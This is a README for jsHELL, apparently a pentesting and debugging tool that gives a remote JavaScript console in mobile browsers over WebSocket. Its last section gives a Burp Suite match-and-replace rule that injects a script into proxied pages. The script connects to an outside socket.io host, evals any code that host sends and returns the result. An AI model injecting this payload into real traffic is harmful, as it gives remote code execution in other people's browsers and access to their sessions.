**jsHELL tries to simulate javascript console for Mobile Browsers. Normally javascript consoles are available for Desktop browsers but not for Mobile browsers. jsHELL uses WebSocket to establish connection between the mobile browser and your Desktop terminal to send the javascript code and receive it's output.**

**How to run?** 

    rlwrap ./jsHELL.py IpAddress Port
    
    Example: rlwrap ./jsHELL.py 127.0.0.1 8080
    
**HTTPS Setup** 

    Step 1. Export DER cert and private key from Burp Suite.
    Step 2. openssl rsa -inform der -in burp-key.der -out key.pem
    Step 3. openssl x509 -inform der -in cacert.der -out certificate.pem

**Injecting to webview or other pages from Burp Proxy**

[ Proxy > Options > Match and Replace ]

`Type`: `Response Body`

`Match` : `</title>`

`Replace` :
```
</title><script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script> <script>  var socket = io.connect('https://10.11.3.2:8089');     try{setTimeout(`socket.emit('sendMSG','Connection Established.')`,1000)}     catch{}     socket.on('getMSG',function(data){         try{              output=eval(data)+""         }         catch(e){             output=e+""         }         socket.emit('sendMSG',output)     }) </script>
```

Note - Change the IP address. If target page does not has </title> tag in response then modify it accordingly.
